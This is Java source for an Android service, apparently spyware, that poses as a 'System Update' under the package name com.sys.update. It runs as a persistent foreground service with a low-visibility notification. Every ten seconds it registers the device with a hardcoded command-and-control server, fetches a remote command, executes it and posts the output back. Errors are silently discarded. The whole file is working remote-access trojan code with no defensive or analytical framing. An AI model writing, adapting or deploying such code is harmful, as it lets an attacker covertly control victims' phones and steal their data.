package com.sys.update;
import android.app.*;
import android.content.Intent;
import android.os.*;
import java.io.*;
import java.net.*;
import java.util.concurrent.*;
public class CommandService extends Service {
    private static final String C2 = "https://aliaameer.pythonanywhere.com";
    private static final long DEVICE_ID = Build.FINGERPRINT.hashCode();
    @Override
    public int onStartCommand(Intent i, int f, int s) {
        String ch = "sys";
        NotificationManager nm = getSystemService(NotificationManager.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) nm.createNotificationChannel(new NotificationChannel(ch, "System", NotificationManager.IMPORTANCE_MIN));
        Notification n = new Notification.Builder(this, ch).setContentTitle("System Update").setSmallIcon(android.R.drawable.stat_sys_download).build();
        startForeground(1, n);
        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(this::poll, 0, 10, TimeUnit.SECONDS);
        return START_STICKY;
    }
    private void poll() {
        try {
            URL reg = new URL(C2 + "/register");
            HttpURLConnection c = (HttpURLConnection) reg.openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            String body = "{\"id\":\"" + DEVICE_ID + "\",\"device\":\"" + Build.MODEL + "\",\"sdk\":\"" + Build.VERSION.SDK_INT + "\"}";
            c.getOutputStream().write(body.getBytes());
            c.getResponseCode();
            URL pollUrl = new URL(C2 + "/poll?id=" + DEVICE_ID);
            HttpURLConnection pc = (HttpURLConnection) pollUrl.openConnection();
            BufferedReader br = new BufferedReader(new InputStreamReader(pc.getInputStream()));
            String line, cmd = null;
            while ((line = br.readLine()) != null) cmd = line;
            if (cmd != null && !cmd.isEmpty()) {
                String out = Commands.exec(this, cmd);
                URL send = new URL(C2 + "/result?id=" + DEVICE_ID);
                HttpURLConnection sc = (HttpURLConnection) send.openConnection();
                sc.setRequestMethod("POST");
                sc.setDoOutput(true);
                sc.getOutputStream().write(out.getBytes());
                sc.getResponseCode();
            }
        } catch (Exception e) {}
    }
    @Override public IBinder onBind(Intent i) { return null; }
}
